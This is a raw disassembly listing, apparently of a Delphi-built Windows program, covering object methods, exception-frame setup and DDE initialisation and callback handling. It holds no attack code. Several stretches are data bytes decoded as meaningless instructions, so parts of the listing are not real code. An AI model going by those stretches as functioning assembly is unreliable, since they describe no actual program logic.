mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_46ba2c
or [ eax ] eax
add [ eax ] al
cmp dh dh
inc edi
add [ esp + ebx * 2 + 0x48 ] al
add [ esi + esi * 8 ] dh
inc edi
add [ esp + ebx * 2 + 0x48 ] al
add [ eax ] dh
test [ edi ] 0x44
pop esp
dec eax
add [ esi + esi * 8 ] ch
inc edi
add [ esp + ebx * 2 + 0x48 ] al
add [ eax ] ch
test [ edi ] 0xb4
pop esp
dec eax
add [ esi + esi * 8 ] ah
inc edi
add ah ah
pop esi
dec eax
add [ eax ] ah
test [ edi ] 0xb8
pop edx
dec eax
add [ esi + esi * 8 ] bl
inc edi
add [ eax + 0x5d ] cl
dec eax
add [ eax ] bl
test [ edi ] 0x4c
pop ebx
dec eax
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46bab4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46babb
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_404bd4
sub_46bae8
xor al 0xbb
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x45 ] ah
inc esi
add [ eax + 0x46bb ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x45 ] bh
inc esi
add [ eax + eax ] ch
add [ eax ] al
nop
xchg ecx eax
inc ecx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add al dh
mov esp 0xbd340046
inc ecx
add [ edi * 4 - 0x421bffbf ] bh
inc esi
add [ eax + eax * 8 + 0x41 ] cl
add [ ecx + eax * 8 ] ch
inc ecx
add [ ecx + eax * 8 + 0x41 ] bl
add [ ecx + eax * 8 + 0x41 ] dl
add [ ebp + edi * 4 - 0x437bffba ] cl
inc esi
add [ eax + 0x600046bc ] bh
mov ebp 0xe0046
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
hlt
sub_46bc48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_469850
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_46be78
sub_46bc84
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] 0x0
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x1
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_46bcb8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_46be30
mov eax ebx
call sub_46be54
sub_46bcf0
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bfe0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_46bd20
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4697fc
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46bd60
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_46bd8c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_41bfa8
mov dl 0x1
mov eax edi
call sub_46be78
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46bde4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4032d8
mov edi eax
mov eax esi
call sub_4032d8
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_404174
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_404174
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_41bc50
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46be30
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_46be54
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_46be78
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_404120
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_404120
xor eax eax
mov [ ebx + 0x1c ] eax
sub_46bea8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46becd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bed4
retn
sub_46c050
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46b87c
mov [ esi + 0x6c ] 0x2000
mov [ esi + 0x7c ] 0xfffffffe
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46c094
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46c140
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46b914
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_46c0e0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov eax [ ebx + 0x68 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ sub_46bae8 ]
call sub_46bd8c
mov [ ebx + 0x68 ] eax
mov eax [ ebx + 0x68 ]
pop esi
pop ebx
retn
xor ecx ecx
mov edx 0x2
call sub_46bc48
mov eax ebx
mov si 0xffef
call sub_40358c
sub_46c140
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x10
jne r-xdata
mov [ esi + 0x70 ] bl
test [ esi + 0x1c ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_46c17c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x80 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x80 ] dl
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
mov eax ebx
mov si 0xffef
call sub_40358c
sub_46c1a8
push ecx
cmp dl 0x1
cmc
sbb edx edx
mov [ esp ] edx
test ecx ecx
jne r-xdata
mov eax esp
push eax
push 0x4
mov edx 0xffff
mov eax ecx
mov ecx 0x20
call sub_46bd20
pop edx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov ecx eax
sub_46c1d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c1fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c204
retn
sub_46c398
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c3bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c3c4
retn
sub_46c3d0
sbb al 0xc4
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3c ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 8 + 0x46 ] ah
add [ eax + eax - 0x3df00000 ] bh
inc esi
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xchg esp eax
rol [ esi ] 0x34
mov ebp 0x3e200041
inc edx
add [ eax - 0x44 ] dl
inc ecx
add [ ecx + eax * 8 ] ah
inc esi
add ah al
cmp eax 0x3f080042
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ esp + eax * 8 - 0x466bffba ] cl
inc esi
add ah cl
mov ecx 0xb9fc0046
inc esi
add [ eax + eax * 8 + 0x46 ] al
add ah al
rol [ esi ] 0xe0
rol [ esi ] 0x7
push esp
dec ecx
push ebx
dec esi
push esp
push eax
jo r-xdata
inc esi
add [ edi ] al
pop es
push esp
dec ecx
push ebx
dec esi
push esp
push eax
sbb al 0xc4
inc esi
add ah cl
retn 0x46
sub_46c481
or [ eax ] eax
push es
dec ecx
push ebx
dec esi
push esp
push eax
add [ eax ] al
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46c050
mov [ esi + 0x78 ] 0x7b
mov [ esi + 0xb8 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46c4d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c4f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c4fc
retn
sub_46c598
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c5bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c5c4
retn
sub_46c655
mov [ esi ] 0x8
mov [ esi ] 0x0
add [ eax ] al
add [ eax ] al
out 0xc6 al
inc esi
add ah dh
mov [ esi ] 0xc8
add [ eax ] al
add [ eax ] bl
popfd
inc ecx
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
pop eax
fld [ esi ]
xor al 0xbd
inc ecx
add [ eax + 0x500046d9 ] bl
mov esp 0xd9e80041
inc esi
add [ eax + 0x80046e2 ] ch
aas
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax ] dl
fld [ esi ]
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
hlt
sub_46c834
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
enter 0x46 0xd4
enter 0x46 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x480046c8 ] bh
add [ eax ] al
add [ eax ] bl
popfd
inc ecx
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
pushad
jecxz r-xdata
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
lea eax [ eax ]
aam 0xc8
inc esi
add [ edi ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
jl r-xdata
add [ edi * 4 + 0x3e200041 ] dh
inc edx
add [ eax - 0x44 ] dl
inc ecx
add al bh
inc edx
add [ esp + 0x46 ] dh
add [ eax ] cl
aas
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ ebx ] bl
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
push cs
push esp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
hlt
inc esi
add [ esi + ebx * 4 ] dl
inc ecx
add [ edi ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x4010f400
add al bh
in al 0x46
add [ 0x10046 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x54
js r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] cl
dec edi
outsb
inc ebx
push 0x65676e61
lea eax [ eax ]
in al dx
leave
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x36 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 8 ] bl
inc esi
add [ edx ] ch
0x46
cmp al 0x94
inc ecx
add [ eax ] dh
add [ eax ] al
[ eax ]
sub_46c91f
in eax 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c050003 ] al
imul ebp [ esi + 0x65 ] 0x46c70473
add [ eax + eax ] dh
add bh bh
nop
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080006 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070004 ] al
inc ebx
outsd
outsb
jbe r-xdata
add [ eax + eax ] 0x7
inc esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
sbb ah ah
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070005 ] al
dec ecx
je r-xdata
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
shr bl 0x1
inc esi
add [ edi * 4 + 0x3e200041 ] dh
inc edx
add [ eax - 0x44 ] dl
inc ecx
add al bh
inc edx
add ah al
cmp eax 0x3f080042
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ ebx + ebp * 8 + 0x20046 ] cl
out dx eax
outsb
inc ebx
push 0x65676e61
lea eax [ eax ]
in al dx
leave
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x36 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 8 ] bl
inc esi
add [ edx ] ch
0x46
insd
pop eax
mov [ ecx ] eax
inc eax
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] cl
dec edi
sub_46cbba
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040003 ] al
js r-xdata
add [ esp + ecx * 8 - 0x332bffba ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
int3
cmp al 0x94
inc ecx
add [ eax ] dh
add [ eax ] al
jmp [ ecx + ebp * 8 + 0x10046 ]
sub_46cd91
inc esi
add [ edi * 4 + 0x3e200041 ] dh
inc edx
add [ eax - 0x44 ] dl
inc ecx
add al bh
inc edx
add ah al
cmp eax 0x3f080042
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ edx + esi * 8 + 0x46 ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
xor al 0x0
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
or al 0xed
inc esi
add [ edi * 4 + 0x3e200041 ] dh
inc edx
jb r-xdata
jo r-xdata
jb r-xdata
add [ eax ] al
add [ edx + 0x480046ce ] bl
add [ eax ] al
add [ eax ] bl
popfd
inc ecx
add [ eax ] bl
inc edx
inc edx
je r-xdata
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
inc esi
add [ edi * 4 - 0x42c3ffbf ] dh
inc ecx
add [ eax - 0x44 ] dl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
iretd
outsd
outsb
jbe r-xdata
add [ eax - 0x44 ] dl
inc ecx
add al bh
inc edx
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ ebp * 8 - 0x42cbffba ] cl
insd
nop
call 0x74714b6
or al 0x54
inc esp
push ebx
jb r-xdata
add ah ah
xor eax 0x3b6c0040
inc edx
sbb [ edx + 0x42 ] al
lodsb [ esi ]
into
inc esi
add [ edi ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add ah al
cmp eax 0x3f080042
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add al cl
in al dx
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
add al 0x0
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
dec esp
iretd
jb r-xdata
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
in al 0x35
inc eax
add [ ebx + edi + 0x42 ] ch
je r-xdata
inc ecx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
outsd
outsb
jbe r-xdata
inc ecx
add [ eax ] ah
inc edx
insd
xchg esp eax
int 0x46
add [ esi + ebx * 4 ] dl
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
pop eax
into
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x53ffb932 ] cl
into
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi + 0x40 ] al
add [ eax - 0x1b ] dh
into
inc esi
add [ esi + ebx * 4 ] dl
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
sbb al 0xcf
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
iretd
sub_46cef2
inc esi
add [ eax + eax ] dl
add [ eax ] al
in al dx
pop [ ecx ]
fdiv [ 0x35e40040 ]
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x1b ] dh
inc esi
add [ edi * 4 - 0x42c3ffbf ] dh
inc ecx
add [ eax - 0x44 ] dl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
add al 0x0
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
dec esp
iretd
sub_46cf4a
inc esi
add [ edi ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xcf1c6d65
inc esi
add [ eax - 0x70 ] ah
inc ecx
add [ ecx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] eax
hlt
sub_46cf8c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor edx edx
push ebp
push sub_46d07e
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d085
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov ebx eax
mov eax ebx
add eax 0xffffbff9
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_4092d8
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_4092d8
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_4092d8
sub_46d08c
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
xor edi edi
mov eax esi
sub eax 0x1062
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_46d434
mov edi eax
and edi 0x7f
jmp r-xdata
sub eax 0x1080
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_46d4e8
mov edi eax
jmp r-xdata
sub eax 0x5f90
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov [ ebp - 0x64 ] 0x60
cmp esi 0x8080
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax [ rw-data ]
call sub_46d54c
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi 0x4050
jg r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call DdeQueryConvInfo
test eax eax
je r-xdata
sub esi 0x4090
je r-xdata
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46eef4
mov edi eax
jmp r-xdata
sub esi 0x3fb0
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46efa8
mov edi eax
jmp r-xdata
sub esi 0x1030
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46eec4
jmp r-xdata
sub esi 0x40
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46ed90
mov edi eax
and edi 0x7f
jmp r-xdata
sub esi 0xff2
je r-xdata
mov eax [ ebp - 0x60 ]
test eax eax
je r-xdata
sub esi 0x42
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46efc8
mov edi eax
jmp r-xdata
sub esi 0x8e
je r-xdata
call sub_46e134
jmp r-xdata
mov ebx [ ebp - 0x60 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46efc8
mov edi eax
jmp r-xdata
sub esi 0x1f60
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
call sub_46e180
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_46d630
mov eax ebx
call sub_46e13c
jmp r-xdata
sub_46d29c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46d350
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_423aa8
push r-xdata
call RegisterClipboardFormatA
mov [ esi + 0x48 ] ax
xor eax eax
mov [ esi + 0x44 ] eax
push 0x0
push 0x0
push sub_46d08c
lea eax [ esi + 0x44 ]
push eax
call DdeInitializeA
test eax eax
sete al
call sub_46cf8c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x38 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x40 ] eax
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_402adc
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_46d678
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d357
lea eax [ ebp - 0x4 ]
call sub_404120
retn
add esp 0xfffffff0
call sub_4036f4
sub_46d379
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
call sub_40375c
